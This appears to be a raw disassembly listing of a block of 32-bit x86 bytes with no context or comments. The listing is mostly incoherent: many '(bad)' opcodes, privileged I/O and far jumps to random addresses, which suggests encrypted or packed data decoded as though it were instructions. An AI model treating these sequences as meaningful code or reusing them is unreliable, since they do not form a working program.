  40bd30:	out    0xe7,eax
  40bd32:	or     eax,0xeee6e0e7
  40bd37:	mov    esp,0xeddcf7f5
  40bd3c:	lods   al,BYTE PTR ds:[esi]
  40bd3d:	int    0xf7
  40bd3f:	jmp    0xdde3:0xd9d5cff6
  40bd46:	add    ch,ch
  40bd48:	sti    
  40bd49:	xlat   BYTE PTR ds:[ebx]
  40bd4a:	(bad)
  40bd4d:	cli    
  40bd4e:	rcr    bh,1
  40bd50:	aad    0xd5
  40bd52:	into   
  40bd53:	push   es
  40bd54:	rep stos BYTE PTR es:[edi],al
  40bd56:	rol    edi,1
  40bd58:	scas   eax,DWORD PTR es:[edi]
  40bd59:	cmc    
  40bd5a:	into   
  40bd5b:	rcl    ebp,cl
  40bd5d:	loopne 0x40bd55
  40bd5f:	mov    ebx,0xffcde4d3
  40bd64:	std    
  40bd65:	sti    
  40bd66:	mov    edx,0x6e3b4db
  40bd6b:	or     ebx,edi
  40bd6d:	fistp  QWORD PTR [esi+0xfd90408]
  40bd73:	(bad)  [edx]
  40bd75:	(bad)
  40bd79:	retf   
  40bd7a:	jmp    0x40bd60
  40bd7c:	(bad)  
  40bd7d:	fidivr DWORD PTR [ecx-0x82c4546]
  40bd83:	(bad)  
  40bd84:	jmp    0xd3d6:0xf6cdff02
  40bd8b:	add    ecx,DWORD PTR [ecx]
  40bd8d:	fcmovu st,st(6)
  40bd8f:	xlat   BYTE PTR ds:[ebx]
  40bd90:	ffree  st(4)
  40bd92:	or     BYTE PTR [eax],cl
  40bd94:	shr    BYTE PTR [edi+ebp*4-0x2d091230],cl
  40bd9b:	xlat   BYTE PTR ds:[ebx]
  40bd9c:	xlat   BYTE PTR ds:[ebx]
  40bd9d:	shl    dh,cl
  40bd9f:	leave  
  40bda0:	hlt    
  40bda1:	not    edi
  40bda3:	call   ebx
  40bda5:	(bad)  
  40bda7:	mov    esp,0xe2fadcd8
  40bdac:	sti    
  40bdad:	add    al,0xfa
  40bdaf:	out    dx,al
  40bdb0:	add    al,ch
  40bdb2:	sti    
  40bdb3:	dec    edx
  40bdb5:	mov    bl,0xc1
  40bdb7:	ret    
  40bdb8:	ret    
  40bdb9:	rcl    edi,1
  40bdbb:	mov    al,0xd6
  40bdbd:	out    0xf9,al
  40bdbf:	div    BYTE PTR [ebp-0x2a200e05]
  40bdc5:	cli    
  40bdc6:	aad    0xe7
  40bdc8:	(bad)  
  40bdc9:	std    
  40bdca:	repz (bad) 
  40bdcc:	icebp  
  40bdcd:	aad    0xf
  40bdcf:	imul   bl
  40bdd1:	add    ebx,ebx
  40bdd3:	(bad)  
  40bdd5:	loopne 0x40bd9c
  40bdd7:	loope  0x40bdbf
  40bdd9:	rol    edi,cl
  40bddb:	ror    cl,0xd5
  40bdde:	rcl    ah,cl
  40bde0:	int3   
  40bde1:	mov    ebx,0xe203d7f3
  40bde6:	not    bl
  40bde8:	hlt    
  40bde9:	(bad)  
  40bdea:	loope  0x40bda5
  40bdec:	in     al,0xf8
  40bdee:	add    cl,bl
  40bdf0:	fmul   QWORD PTR [ecx]
  40bdf2:	or     eax,0xbeea06fe
  40bdf7:	les    esi,FWORD PTR [esi-0x2b0f0918]
  40bdfd:	hlt    
  40bdfe:	(bad)  
  40bdff:	sar    ch,1
  40be01:	retf   
  40be02:	(bad)  
  40be03:	out    dx,al
  40be04:	add    esi,ecx
  40be06:	(bad)  
  40be07:	ror    ah,cl
  40be09:	out    0xfe,eax
  40be0b:	les    eax,FWORD PTR [esi]
  40be0d:	jecxz  0x40bde4
  40be0f:	(bad)  
  40be11:	add    eax,0xf3e6fae0
  40be16:	jecxz  0x40be01
  40be18:	shl    ah,1
  40be1a:	in     eax,0xc5
  40be1c:	sti    
  40be1d:	loopne 0x40be14
  40be1f:	xlat   BYTE PTR ds:[ebx]
  40be20:	out    0xb8,al
  40be22:	jmp    0xb942b5e6
  40be27:	ret    
  40be28:	loope  0x40be05
  40be2a:	test   DWORD PTR [ebx+ecx*1],0xc7e0c502
  40be31:	std    
  40be32:	std    
  40be33:	or     al,0xe5
  40be35:	mov    cl,0xf0
  40be37:	mov    cl,0xe3
  40be39:	(bad)
  40be3c:	sar    cl,cl
  40be3e:	(bad)  
  40be3f:	not    edx
  40be41:	mov    edi,0xc1ccb9f2
  40be46:	mov    eax,0xbaf405f1
  40be4b:	shl    ch,cl
  40be4d:	fadd   QWORD PTR [edx]
  40be4f:	add    ecx,ecx
  40be51:	push   es
  40be52:	add    dh,ah
  40be54:	add    esp,DWORD PTR [edi-0x1e23433b]
  40be5a:	mov    esp,0xb4e5a8cd
  40be5f:	shl    DWORD PTR [edi-0x13080f2f],1
  40be65:	rcr    esi,cl
  40be67:	(bad)  
  40be69:	loope  0x40be31
  40be6b:	hlt    
  40be6c:	idiv   ah
  40be6e:	cld    
  40be6f:	(bad)  
  40be70:	cmc    
  40be71:	out    0xcb,al
  40be73:	add    al,0x0
  40be75:	fsub   st,st(1)
  40be77:	in     eax,0xd0
  40be79:	ret    0xf4d6
  40be7c:	sar    cl,0xba
  40be7f:	out    0xf2,al
  40be81:	mov    ebp,0xd4d5b1d9
  40be86:	cmc    
  40be87:	pop    es
  40be88:	inc    BYTE PTR [edx]
  40be8a:	repz hlt 
  40be8c:	fmul   st,st(1)
  40be8e:	retf   0xcfc7
  40be91:	out    0xfe,al
  40be93:	out    dx,eax
  40be94:	enter  0xb1c3,0xf6
  40be98:	in     eax,0xb7
  40be9a:	(bad)  
  40be9b:	in     al,0xf3
  40be9d:	out    0xff,al
  40be9f:	mov    bh,0xe9
  40bea1:	aam    0xf8
  40bea3:	mov    ecx,0x2f3cd
  40bea8:	ret    0xe3fe
  40beab:	(bad)  
  40beac:	retf   0xe7fb
  40beaf:	std    
  40beb0:	idiv   cl
  40beb2:	enter  0xf1cf,0xe3
  40beb6:	mov    eax,0xc4efd2ae
  40bebb:	rcl    ebx,1
  40bebd:	leave  
  40bebe:	cmc    
  40bebf:	ror    dh,1
  40bec1:	mov    esi,0xf9fad7f7
  40bec6:	xlat   BYTE PTR ds:[ebx]
  40bec7:	int3   
  40bec8:	add    eax,0xc7bcec01
  40becd:	push   es
  40bece:	stc    
  40becf:	aam    0xd5
  40bed1:	or     BYTE PTR [edx],cl
  40bed3:	out    dx,al
  40bed4:	adc    DWORD PTR [ebp-0x2e37303d],ebp
  40beda:	repnz in eax,dx
  40bedc:	cli    
  40bedd:	mov    dl,0xf8
  40bedf:	clc    
  40bee0:	fdivp  st(3),st
  40bee2:	(bad)  
  40bee4:	in     al,dx
  40bee5:	jmp    0xe217b3aa
  40beea:	ret    
  40beeb:	rcr    ebx,cl
  40beed:	in     eax,0xf5
  40beef:	add    ecx,ecx
  40bef1:	fdiv   st(6),st
  40bef3:	int    0x1
  40bef5:	jmp    0xeeef:0xe9ccc2ed
  40befc:	icebp  
  40befd:	mov    ah,0xcf
  40beff:	xlat   BYTE PTR ds:[ebx]
  40bf00:	call   0xd1f2aabb
  40bf05:	cld    
  40bf06:	icebp  
  40bf07:	std    
  40bf08:	into   
  40bf09:	fadd   DWORD PTR [edi+eax*1]
  40bf0c:	rol    BYTE PTR [esi],0xcb
  40bf0f:	enter  0xe8ee,0xe4
  40bf13:	int3   
  40bf14:	fidiv  WORD PTR [ebx-0x9305037]
  40bf1a:	cmc    
  40bf1b:	into   
  40bf1c:	loopne 0x40bed8
  40bf1e:	call   0xd70c84d7
  40bf23:	add    esi,ebx
  40bf25:	mov    edi,0xe4f2ecec
  40bf2a:	add    al,0xc5
  40bf2c:	cmc    
  40bf2d:	ret    0xed9
  40bf30:	faddp  st(6),st
  40bf32:	sti    
  40bf33:	in     al,dx
  40bf34:	adc    DWORD PTR [eax-0x341b363b],edi
  40bf3a:	rol    edx,cl
  40bf3c:	(bad)  
  40bf3d:	mov    ch,0xf9
  40bf3f:	mov    edi,0xb8eebaff
  40bf44:	add    bl,cl
  40bf46:	fmul   st(7),st
  40bf48:	pop    es
  40bf49:	shl    ebx,0xdf
  40bf4c:	fadd   st,st(7)
  40bf4e:	add    eax,0xdfe307ca
  40bf53:	shr    esp,cl
  40bf55:	mov    ebp,0xc4e8bda8
  40bf5a:	out    0xf6,al
  40bf5c:	out    dx,al
  40bf5d:	hlt    
  40bf5e:	mov    cl,0xb0
  40bf60:	shl    ch,cl
  40bf62:	out    dx,al
  40bf63:	(bad)  
  40bf65:	add    eax,ebx
  40bf67:	int    0xc0
  40bf69:	in     al,0xd1
  40bf6b:	hlt    
  40bf6c:	rol    DWORD PTR [ebx],0x4
  40bf6f:	fsubrp st(1),st
  40bf71:	clc    
  40bf72:	jecxz  0x40bf42
  40bf74:	std    
  40bf75:	in     eax,0xd8
  40bf77:	jmp    0xb6f0:0xb5c2c7f3
  40bf7e:	shl    edi,cl
  40bf80:	retf   
  40bf81:	(bad)  
  40bf82:	sti    
  40bf83:	(bad)  
  40bf85:	cli    
  40bf86:	mov    ecx,0xf0c7fece
  40bf8b:	add    al,0x0
  40bf8d:	(bad)  
  40bf8e:	out    0xf6,eax
  40bf90:	add    cl,dh
  40bf92:	(bad)  
  40bf93:	fld    DWORD PTR [ecx+eiz*8]
  40bf96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf97:	retf   
  40bf98:	(bad)  
  40bf99:	enter  0xd0d6,0xc5
  40bf9d:	rol    bh,cl
  40bf9f:	out    dx,al
  40bfa0:	(bad)  
  40bfa2:	icebp  
  40bfa3:	fdivr  QWORD PTR [edx-0x2e05253e]
  40bfa9:	in     eax,dx
  40bfaa:	add    esi,eax
  40bfac:	mov    esp,0xefdefbd7
  40bfb1:	add    DWORD PTR [eax],ecx
  40bfb3:	or     eax,0xe0e1eecb
  40bfb8:	mov    esi,0xa8d6f5d6
  40bfbd:	int3   
  40bfbe:	cmc    
  40bfbf:	shl    DWORD PTR [eax+edi*4-0x7351010],1
  40bfc6:	mov    edi,0x3e6f3d2
  40bfcb:	mov    ebp,0xee04e8d2
  40bfd0:	cld    
  40bfd1:	or     bh,bl
  40bfd3:	fsin   
  40bfd5:	out    0xb1,al
  40bfd7:	scas   al,BYTE PTR es:[edi]
  40bfd8:	mov    ebp,0xf2c7f0e9
  40bfdd:	fdiv   st,st(6)
  40bfdf:	out    dx,eax
  40bfe0:	out    dx,eax
  40bfe1:	hlt    
  40bfe2:	clc    
  40bfe3:	mov    ebp,0xd8fcdcf3
  40bfe8:	mov    esi,0xf9d8f3cd
  40bfed:	icebp  
  40bfee:	out    0xdf,al
  40bff0:	add    esp,esp
  40bff2:	adc    ebp,ecx
  40bff4:	into   
  40bff5:	retf   0xa5ce
  40bff8:	in     eax,0xe5
  40bffa:	into   
  40bffb:	into   
  40bffc:	enter  0xeaef,0xf0
  40c000:	mov    edi,0xf4e3dbf5
  40c005:	fistp  QWORD PTR [esi+0xd9cdd2]
  40c00b:	loopne 0x40bff0
  40c00d:	add    dl,ah
  40c00f:	add    eax,0xc00eaed
  40c014:	bnd ret 0xf3aa
  40c018:	ret    0xcbc2
  40c01b:	fucomi st,st(1)
  40c01d:	scas   eax,DWORD PTR es:[edi]
  40c01e:	out    dx,al
  40c01f:	int    0xe4
  40c021:	int3   
  40c022:	std    
  40c023:	aam    0xe9
  40c025:	add    cl,al
  40c027:	add    esp,edx
  40c029:	fild   DWORD PTR [edi]
  40c02b:	(bad)  
  40c02c:	fdivp  st(4),st
  40c02e:	sti    
  40c02f:	bswap  edx
  40c031:	in     eax,dx
  40c032:	add    bl,dl
  40c034:	add    al,0xac
  40c036:	test   al,0xa9
  40c038:	mov    ebp,0xc2a9f1f0
  40c03d:	out    0xdf,eax
  40c03f:	ffreep st(5)
  40c041:	fsubr  st,st(0)
  40c043:	mov    cl,0xc2
  40c045:	add    esp,ebx
  40c047:	mov    edi,0xc5f9dad4
  40c04c:	or     DWORD PTR [ecx],eax
  40c04e:	fst    st(6)
  40c050:	(bad)  
  40c051:	or     eax,0xf0d213ff
  40c056:	shr    dl,1
  40c058:	test   al,0xc5
  40c05a:	mul    al
  40c05c:	in     al,0xd6
  40c05e:	stc    
  40c05f:	out    dx,eax
  40c060:	lock hlt 
  40c062:	in     al,dx
  40c063:	enter  0xf3c2,0xdd
  40c067:	fsubr  st,st(5)
  40c069:	lock (bad) 
  40c06c:	cli    
  40c06d:	pop    es
  40c06e:	xlat   BYTE PTR ds:[ebx]
  40c06f:	fiadd  DWORD PTR [eax]
  40c071:	std    
  40c072:	push   es
  40c073:	jmp    0xdd05a266
  40c078:	in     eax,0xe9
  40c07a:	mov    dl,0xf1
  40c07c:	int    0xb9
  40c07e:	mov    eax,0xdbf8cef6
  40c083:	(bad)  
  40c085:	fucomip st,st(6)
  40c087:	not    esi
  40c089:	repnz stc 
  40c08b:	(bad)  
  40c08c:	or     edx,esp
  40c08e:	in     al,0xe
  40c090:	jmp    0xc1c3:0x1313c8c3
  40c097:	mov    cl,0xe8
  40c099:	mov    bh,0xe6
  40c09b:	retf   0xf7ce
  40c09e:	mov    eax,0xffb5cae5
  40c0a3:	(bad)  
  40c0a5:	loopne 0x40c0aa
  40c0a7:	hlt    
  40c0a8:	out    dx,al
  40c0a9:	int3   
  40c0aa:	cli    
  40c0ab:	icebp  
  40c0ac:	(bad)  
  40c0ad:	jecxz  0x40c091
  40c0af:	add    eax,0x8e8f5fb
  40c0b4:	icebp  
  40c0b5:	mov    eax,0xc7c2c3d3
  40c0ba:	test   edi,0xb4d0eeed
  40c0c0:	hlt    
  40c0c1:	lock ror cl,cl
  40c0c4:	repz add edi,ebx
  40c0c7:	fld    QWORD PTR [esi]
  40c0c9:	sar    dh,cl
  40c0cb:	(bad)  
  40c0cc:	jecxz  0x40c0b7
  40c0ce:	call   0xf028ccad
  40c0d3:	out    0xe8,eax
  40c0d5:	mov    bl,0xb8
  40c0d7:	lds    esi,FWORD PTR [edx-0x252d190d]
  40c0dd:	mov    cl,0xf4
  40c0df:	mov    edi,0xd8eedcff
  40c0e4:	out    dx,al
  40c0e5:	mov    esi,0xf4cee6fe
  40c0ea:	icebp  
  40c0eb:	shl    al,0xe1
  40c0ee:	imul   esi
  40c0f0:	(bad)  
  40c0f1:	(bad)  
  40c0f3:	out    0x1,eax
  40c0f5:	in     eax,dx
  40c0f6:	shl    cl,1
  40c0f8:	shl    al,cl
  40c0fa:	sar    edx,0xda
  40c0fd:	(bad)  
  40c0ff:	lods   eax,DWORD PTR ds:[esi]
  40c100:	xlat   BYTE PTR ds:[ebx]
  40c101:	mov    bl,0xf9
  40c103:	fyl2xp1 
  40c105:	hlt    
  40c106:	iret   
  40c107:	mov    eax,0xd2dfe4e6
  40c10c:	loop   0x40c10b
  40c10e:	cli    
  40c10f:	clc    
  40c110:	pmaxsw mm1,mm5
  40c113:	out    0xe,eax
  40c115:	shr    DWORD PTR [eax-0x432a2218],1
  40c11b:	hlt    
  40c11c:	test   al,0xba
  40c11e:	mov    al,0xcc
  40c120:	idiv   ebx
  40c122:	mov    ebp,0xc8ccfad8
  40c127:	rol    ecx,cl
  40c129:	neg    dl
  40c12b:	out    0xc7,al
  40c12d:	fdivr  st(4),st
  40c12f:	fnstsw WORD PTR [esi+eax*1-0x3b20140c]
  40c136:	call   0xc8127dff
  40c13b:	mov    dh,0xb7
  40c13d:	scas   eax,DWORD PTR es:[edi]
  40c13e:	idiv   BYTE PTR [ecx-0x6022242]
  40c144:	(bad)  
  40c146:	fdivp  st(7),st
  40c148:	mul    bl
  40c14a:	push   esi
  40c14c:	xlat   BYTE PTR ds:[ebx]
  40c14d:	cld    
  40c14e:	add    al,0xe5
  40c150:	out    dx,al
  40c151:	jmp    0xb326a518
  40c156:	(bad)  
  40c157:	enter  0xcfbd,0xf3
  40c15b:	repnz xlat BYTE PTR ds:[ebx]
  40c15d:	mov    al,0xf2
  40c15f:	out    0xed,eax
  40c161:	repnz (bad) 
  40c163:	repnz fnstsw ax
  40c166:	aad    0xdc
  40c168:	mov    esi,0xd8c4f1cc
  40c16d:	sti    
  40c16e:	call   esp
  40c170:	out    0xdc,eax
  40c172:	jecxz  0x40c17f
  40c174:	in     al,0xe2
  40c176:	lock retf 
  40c178:	loop   0x40c144
  40c17a:	scas   al,BYTE PTR es:[edi]
  40c17b:	aad    0xf6
  40c17d:	cmc    
  40c17e:	mov    eax,0xd2eaddeb
  40c183:	fnstsw WORD PTR [edx-0x393f1e04]
  40c189:	ret    0xf7f5
  40c18c:	sar    cl,0xfb
  40c18f:	loopne 0x40c16b
  40c191:	loop   0x40c158
  40c193:	jecxz  0x40c181
  40c195:	jmp    0xc7f88a59
  40c19a:	leave  
  40c19b:	mov    dh,0xb6
  40c19d:	(bad)  
  40c19e:	mov    al,0xb0
  40c1a0:	lock aam 0xe9
  40c1a3:	hlt    
  40c1a4:	add    ebx,edx
  40c1a6:	std    
  40c1a7:	stc    
  40c1a8:	mov    ebp,0x6c2dcd3
  40c1ad:	(bad)  
  40c1af:	fisttp WORD PTR ds:0xdceb04f4
  40c1b5:	(bad)  
  40c1b6:	enter  0xccbc,0xe3
  40c1ba:	shl    BYTE PTR [esp+ebp*4-0x333a2b49],0xf1
  40c1c2:	xlat   BYTE PTR ds:[ebx]
  40c1c3:	int3   
  40c1c4:	retf   0xbfe8
  40c1c7:	ret    0xfef2
  40c1ca:	(bad)  
  40c1cc:	add    al,0xbf
  40c1ce:	fst    st(4)
  40c1d0:	add    dh,ch
  40c1d2:	push   cs
  40c1d3:	push   cs
  40c1d4:	leave  
  40c1d5:	ret    0xbcc4
  40c1d8:	out    0xe9,eax
  40c1da:	aad    0xc0
  40c1dc:	mov    dl,0xe0
  40c1de:	clc    
  40c1df:	int    0xd3
  40c1e1:	retf   
  40c1e2:	in     eax,dx
  40c1e3:	ffree  st(3)
  40c1e5:	jmp    0xed1a79eb
  40c1ea:	sar    ebx,1
  40c1ec:	ret    0xdad6
  40c1ef:	fcmovu st,st(1)
  40c1f1:	(bad)  
  40c1f3:	leave  
  40c1f4:	call   0xc9f894bd
  40c1f9:	imul   BYTE PTR [ebp-0xd19572a]
  40c1ff:	mov    ecx,0xc3c9cbd8
  40c204:	sar    al,cl
  40c206:	sti    
  40c207:	shl    cl,0xe7
  40c20a:	sar    bl,cl
  40c20c:	add    bh,bl
  40c20e:	jmp    0xd9499207
  40c213:	add    ah,dl
  40c215:	out    dx,al
  40c216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c217:	mov    bl,0xe3
  40c219:	jmp    0xd0da:0xd4d0fbc9
  40c220:	int3   
  40c221:	vpsllw ymm6,ymm0,xmm0
  40c225:	in     eax,dx
  40c226:	mov    ecx,0xd6bff6f8
  40c22b:	clc    
  40c22c:	xlat   BYTE PTR ds:[ebx]
  40c22d:	std    
  40c22e:	xlat   BYTE PTR ds:[ebx]
  40c22f:	dec    BYTE PTR [edx]
  40c231:	in     eax,dx
  40c232:	out    0xeb,eax
  40c234:	inc    ebp
  40c236:	fbstp  TBYTE PTR [edx-0x2d150a2e]
  40c23c:	mov    dl,0xf0
  40c23e:	mov    eax,0xb6f6b8fa
  40c243:	add    dh,ch
  40c245:	mov    esi,0xc502ddee
  40c24a:	loop   0x40c205
  40c24c:	shl    ebp,1
  40c24e:	leave  
  40c24f:	add    ecx,ebp
  40c251:	clc    
  40c252:	repz iret 
  40c254:	(bad)  
  40c255:	in     al,dx
  40c256:	ret    
  40c257:	jmp    0x40c250
  40c259:	scas   al,BYTE PTR es:[edi]
  40c25a:	lock shl BYTE PTR [edx-0xf2d3f3a],1
  40c261:	enter  0xd8f9,0xdc
  40c265:	(bad)  
  40c267:	neg    esi
  40c269:	(bad)  
  40c26a:	cld    
  40c26b:	sar    esp,1
  40c26d:	ret    
  40c26e:	enter  0xf801,0x4
  40c272:	or     eax,0xd2ebe205
  40c277:	jmp    0xd4b0:0xb3b0bcb1
  40c27e:	hlt    
  40c27f:	repz mov ecx,0xefdbfef6
  40c285:	iret   
  40c286:	div    bh
  40c288:	sti    
  40c289:	rcr    cl,1
  40c28b:	jmp    0xc4c0:0x1be0add
  40c292:	std    
  40c293:	jecxz  0x40c291
  40c295:	rcr    bh,cl
  40c297:	loop   0x40c28f
  40c299:	(bad)  
  40c29a:	into   
  40c29b:	mul    cl
  40c29d:	in     eax,dx
  40c29e:	rcr    ebx,cl
  40c2a0:	cli    
  40c2a1:	icebp  
  40c2a2:	mov    ch,0xf4
  40c2a4:	in     eax,dx
  40c2a5:	call   0xc304aa72
  40c2aa:	or     eax,edi
  40c2ac:	clc    
  40c2ad:	add    al,0x1
  40c2af:	add    al,0xcf
  40c2b1:	fstp   st(1)
  40c2b3:	repnz (bad) 
  40c2b6:	out    0xea,al
  40c2b8:	call   0xc61b95aa
  40c2bd:	jmp    0xf8ee:0xefded2db
  40c2c4:	cmc    
  40c2c5:	cld    
  40c2c6:	cli    
  40c2c7:	aam    0xc7
  40c2c9:	ret    0xf5f2
  40c2cc:	aad    0xfe
  40c2ce:	(bad)  
  40c2cf:	(bad)  
  40c2d1:	add    bh,bl
  40c2d3:	fnstsw ax
  40c2d5:	mov    edi,0xe8dee3c3
  40c2da:	lock cli 
  40c2dc:	mov    dl,0xc1
  40c2de:	cmc    
  40c2df:	cli    
  40c2e0:	in     eax,dx
  40c2e1:	fucompp 
  40c2e3:	out    dx,eax
  40c2e4:	std    
  40c2e5:	ret    0xd1ce
  40c2e8:	(bad)  
  40c2ea:	add    ah,ah
  40c2ec:	fmul   st,st(1)
  40c2ee:	(bad)  
  40c2ef:	sti    
  40c2f0:	sti    
  40c2f1:	add    cl,bh
  40c2f3:	dec    ebp
  40c2f5:	iret   
  40c2f6:	sar    BYTE PTR [esi-0x48554f49],cl
  40c2fc:	rcl    esp,1
  40c2fe:	icebp  
  40c2ff:	out    0xc5,al
  40c301:	stc    
  40c302:	mov    ebx,0xe20103ef
  40c307:	mov    esp,0x2f6e1ee
  40c30c:	(bad)  
  40c30d:	add    ebp,ebx
  40c30f:	add    al,0xe7
  40c311:	fild   WORD PTR [ecx]
  40c313:	jmp    0xdf238104
  40c318:	iret   
  40c319:	aam    0xf4
  40c31b:	mov    dl,0xe0
  40c31d:	sti    
  40c31e:	aad    0xe4
  40c320:	mov    ecx,0xe8cfebfd
  40c325:	(bad)  
  40c326:	fld    QWORD PTR [edx]
  40c328:	rcr    ecx,1
  40c32a:	stc    
  40c32b:	pop    es
  40c32c:	or     eax,edi
  40c32e:	loop   0x40c2f9
  40c330:	retf   
  40c331:	out    0xf9,eax
  40c333:	push   es
  40c334:	int3   
  40c335:	ret    
  40c336:	leave  
  40c337:	loopne 0x40c2e9
  40c339:	out    dx,al
  40c33a:	shl    esp,1
  40c33c:	out    0xf3,al
  40c33e:	jmp    0xe2bd:0xb5facecf
  40c345:	add    esp,esi
  40c347:	fucom  st(2)
  40c349:	in     eax,0xd0
  40c34b:	repnz add dl,ch
  40c34e:	enter  0xeaef,0xe2
  40c352:	sti    
  40c353:	add    bl,dl
  40c355:	(bad)  
  40c357:	mov    ebp,0xc7b3c0b7
  40c35c:	ror    ebx,cl
  40c35e:	jmp    0xb9df:0xfacbd6ad
  40c365:	std    
  40c366:	f2xm1  
  40c368:	cmc    
  40c369:	fidivr DWORD PTR [esi+0x5c6cad0]
  40c36f:	mov    ebp,0xe80dc503
  40c374:	(bad)  
  40c375:	scas   eax,DWORD PTR es:[edi]
  40c376:	retf   
  40c377:	(bad)  
  40c378:	(bad)  
  40c379:	lods   eax,DWORD PTR ds:[esi]
  40c37a:	imul   esi
  40c37c:	loope  0x40c349
  40c37e:	out    dx,al
  40c37f:	aam    0xd8
  40c381:	std    
  40c382:	div    cl
  40c384:	mov    ebp,0xecceedbc
  40c389:	int    0xf5
  40c38b:	fild   WORD PTR [eax]
  40c38d:	aad    0xca
  40c38f:	(bad)  
  40c390:	std    
  40c391:	stc    
  40c392:	add    esi,ecx
  40c394:	(bad)
  40c398:	in     al,0xc7
  40c39a:	shr    esi,1
  40c39c:	out    dx,al
  40c39d:	mov    ebx,0xffbaf8f8
  40c3a2:	icebp  
  40c3a3:	sar    DWORD PTR [esi-0x33fc292e],1
  40c3a9:	mov    BYTE PTR [edi],0x3
  40c3ac:	pop    es
  40c3ad:	shl    edi,0xcf
  40c3b0:	add    al,0xcd
  40c3b2:	fcmovnb st,st(4)
  40c3b4:	enter  0xe0c1,0xa9
  40c3b8:	jmp    0xb7f8b790
  40c3bd:	rol    ebp,cl
  40c3bf:	stc    
  40c3c0:	into   
  40c3c1:	push   edx
  40c3c3:	rol    DWORD PTR [ecx],1
  40c3c5:	loop   0x40c394
  40c3c7:	loopne 0x40c3c1
  40c3c9:	mov    esi,0x8f90ad9
  40c3ce:	paddusb mm6,mm4
  40c3d1:	or     BYTE PTR ds:0xd8efdf03,cl
  40c3d7:	out    0xe7,eax
  40c3d9:	loopne 0x40c3c8
  40c3db:	jecxz  0x40c3a9
  40c3dd:	rcl    esi,cl
  40c3df:	in     eax,0xbf
  40c3e1:	retf   0xbcd5
  40c3e4:	mov    esi,0xccf1ccd3
  40c3e9:	pop    es
  40c3ea:	aam    0xcb
  40c3ec:	(bad)  
  40c3ed:	jmp    0xc913:0xe8fcfef7
  40c3f4:	or     ecx,ebx
  40c3f6:	rol    dh,0xe8
  40c3f9:	mov    al,0xf5
  40c3fb:	in     eax,0xe4
  40c3fd:	mov    ebx,0xb3e4cbf9
  40c402:	rcr    eax,1
  40c404:	fprem1 
  40c406:	fcmovnbe st,st(3)
  40c408:	(bad)  
  40c40a:	loope  0x40c3cc
  40c40c:	cld    
  40c40d:	les    eax,FWORD PTR [eax]
  40c40f:	out    0xf4,al
  40c411:	hlt    
  40c412:	out    dx,al
  40c413:	out    0xcc,al
  40c415:	mov    edi,0xc3b0b3ef
  40c41a:	iret   
  40c41b:	jecxz  0x40c3e3
  40c41d:	mov    ah,0xea
  40c41f:	iret   
  40c420:	lock lock shr dl,1
  40c424:	sar    edx,1
  40c426:	int    0xd3
  40c428:	idiv   BYTE PTR [edi+0x2fadbbe]
  40c42e:	call   0xde1ec30f
  40c433:	clc    
  40c434:	adc    ebp,ecx
  40c436:	out    0xaf,al
  40c438:	call   0xb6258d09
  40c43d:	out    dx,al
  40c43e:	call   0xd7178313
  40c443:	mov    esp,0xd2f2f2f0
  40c448:	in     eax,dx
  40c449:	ret    0xe5da
  40c44c:	jecxz  0x40c445
  40c44e:	add    ah,ch
  40c450:	(bad)  
  40c452:	ffreep st(1)
  40c454:	leave  
  40c455:	mov    ebp,0xd5e4e3af
  40c45a:	jecxz  0x40c424
  40c45c:	jmp    0xacf97b2e
  40c461:	mov    esi,0xecd3cafb
  40c466:	add    DWORD PTR [edi+esi*8-0x1c143bfe],edi
  40c46d:	(bad)  
  40c46e:	mov    ch,0x6
  40c471:	hlt    
  40c472:	sti    
  40c473:	(bad)  
  40c475:	shl    eax,1
  40c477:	mov    al,0xea
  40c479:	(bad)  
  40c47a:	out    dx,eax
  40c47b:	mov    bl,0xfb
  40c47d:	leave  
  40c47e:	fldl2e 
  40c480:	mov    edx,0xd8d2dbe9
  40c485:	shl    ah,1
  40c487:	mov    ecx,0xdddaf600
  40c48c:	in     al,0x9
  40c48e:	add    al,0xdb
  40c490:	or     DWORD PTR [edi],eax
  40c492:	add    bl,dl
  40c494:	add    cl,cl
  40c496:	ror    ebp,0xe9
  40c499:	ror    esp,cl
  40c49b:	sti    
  40c49c:	(bad)  
  40c49d:	out    dx,eax
  40c49e:	call   0xd0117f69
  40c4a3:	(bad)  
  40c4a5:	(bad)  
  40c4a6:	fchs   
  40c4a8:	loop   0x40c49b
  40c4aa:	icebp  
  40c4ab:	mov    ebp,0x200c6f5
  40c4b0:	add    bh,al
  40c4b2:	std    
  40c4b3:	adc    bl,dl
  40c4b5:	in     eax,dx
  40c4b6:	scas   eax,DWORD PTR es:[edi]
  40c4b7:	out    0xb7,eax
  40c4b9:	shl    al,0xd4
  40c4bc:	xlat   BYTE PTR ds:[ebx]
  40c4bd:	int3   
  40c4be:	iret   
  40c4bf:	repnz enter 0xdff5,0xdf
  40c4c4:	loop   0x40c4a8
  40c4c6:	cmc    
  40c4c7:	iret   
  40c4c8:	out    0xfe,al
  40c4ca:	add    al,0xbc
  40c4cc:	jecxz  0x40c4c5
  40c4ce:	(bad)  
  40c4cf:	or     edi,eax
  40c4d1:	push   cs
  40c4d2:	or     BYTE PTR [ebx],dl
  40c4d4:	int3   
  40c4d5:	loopne 0x40c48a
  40c4d7:	fadd   st(5),st
  40c4d9:	stos   DWORD PTR es:[edi],eax
  40c4da:	out    dx,eax
  40c4db:	(bad)  
  40c4dc:	repz loope 0x40c4aa
  40c4df:	hlt    
  40c4e0:	(bad)  
  40c4e1:	mov    ah,0xf7
  40c4e3:	cmc    
  40c4e4:	std    
  40c4e5:	rol    DWORD PTR [edi],cl
  40c4e7:	test   eax,0xe3e4d1c7
  40c4ed:	or     edx,edi
  40c4ef:	jecxz  0x40c4e6
  40c4f1:	hlt    
  40c4f2:	add    eax,0xdfcae9ff
  40c4f7:	mov    cl,0xc5
  40c4f9:	mov    cl,0xcb
  40c4fb:	in     eax,dx
  40c4fc:	icebp  
  40c4fd:	shl    eax,cl
  40c4ff:	fdiv   st,st(2)
  40c501:	lock mov esi,0xfcccbddd
  40c507:	int    0xdd
  40c509:	std    
  40c50a:	(bad)
  40c50d:	(bad)  
  40c50e:	fsubr  st(0),st
  40c510:	or     bh,ah
  40c512:	retf   0xffd
  40c515:	ror    esi,0xd1
  40c518:	aad    0xad
  40c51a:	sti    
  40c51b:	mov    dl,0xee
  40c51d:	mov    ecx,0xf4deecf2
  40c522:	call   0xfe15a709
  40c527:	repnz xbegin 0xd145a805
  40c52e:	call   0x24cc429
  40c533:	out    0xc,eax
  40c535:	in     al,dx
